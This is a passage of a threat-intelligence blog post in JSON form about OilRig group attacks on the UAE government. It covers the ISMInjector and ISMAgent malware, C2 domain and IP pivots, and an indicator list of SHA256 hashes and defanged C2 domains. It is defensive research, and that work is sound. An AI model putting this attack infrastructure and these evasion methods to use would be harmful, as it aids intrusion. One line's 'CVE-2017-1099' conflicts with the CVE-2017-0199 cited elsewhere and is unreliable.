                "Reverse resolution of this domain provides us the IP 74.91.19.122, which again is not used for any other domain resolution.",
                "Another IP on the same /24 is found at 74.91.19.108 resolving to msoffice365update[.]com which happens to be the C2 domain for the ISMAgent payload delivered by the malicious document exploiting CVE-2017-1099 mentioned earlier in this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As previously discussed, the .dot file attempting to exploit CVE-2017-0199 uses msoffice-cdn[.]com as a C2 to retrieve additional malicious code.",
                "Reverse resolution of this domain shows an IP of 185.162.235.121, which shares a /24 netblock with 185.162.235.29.",
                "This IP resolves to office365-management[.]com which is the C2 for a secondary .dot file we were able to collect in this attack wave.",
                "In figure 5 below you can see the OilRig infrastructure for ISMInjector that our research uncovered."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 OilRig infrastructure for ISMInjector"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The OilRig group continues to target organizations in the Middle East, in this instance targeting the government of the United Arab Emirates.",
                "They continue to use the ISMAgent Trojan as the final payload in their attacks, this time in conjunction with a custom injector Trojan to assist with delivery and execution.",
                "The injector Trojan was obfuscated using a known crypter and used state-machines as an anti-analysis technique to complicate its process to inject the payload into another process.",
                "The use of crypters and anti-analysis techniques suggests that the threat actors are increasing their efforts to evade security products to successfully compromise its targets."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As our research continues to expand into the OilRig group, we are continuously discovering new infrastructure which directly overlaps with previously used infrastructure.",
                "With the addition of the reuse of tools, similar attack protocols, as well as consistent victimology, we have strong confidence that the original OilRig attack campaign is indeed a single, unique, and previously unknown threat group that will hereby be referred to as the OilRig group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from ISMInjector, ISMAgent and ThreeDollars by the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ThreeDollars SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ISMInjector SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ISMAgent SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "74f61b6ff0eb58d76f4cacfb1504cb6b72684d0d0980d42cba364c6ef28223a8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ISMAgent C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cdnmsnupdate[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Related CVE-2017-0199 SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "66358a295b8b551819e053f2ee072678605a5f2419c1c486e454ab476c40ed6a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Related CVE-2017-0199 Domains"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "msoffice-cdn[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "office365-management[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f92ab374edd488d85f2e113b40ea8cb8baf993f5c93c12455613ad3265f42b17 (CVE-2017-0199)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fcad263d0fe2b418db05f47d4036f0b42aaf201c9b91281dfdcb3201b298e4f4 (ISMInjector)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0ccb2117c34e3045a4d2c0d193f1963c8c0e8566617ed0a561546c932d1a5c0c",
                "(ThreeDollars)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a9f1375da973b229eb649dc3c07484ae7513032b79665efe78c0e55a6e716821 (ISMAgent)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "963f93824d87a56fe91283652eab5841e2ec538c207091dbc9606b962e38805d (ISMAgent)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ntpupdateserver[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cdnakamaiplanet[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "msoffice365update[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "adpolioe[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Microsoft-publisher[.]com"
            ]
        }
    ]
}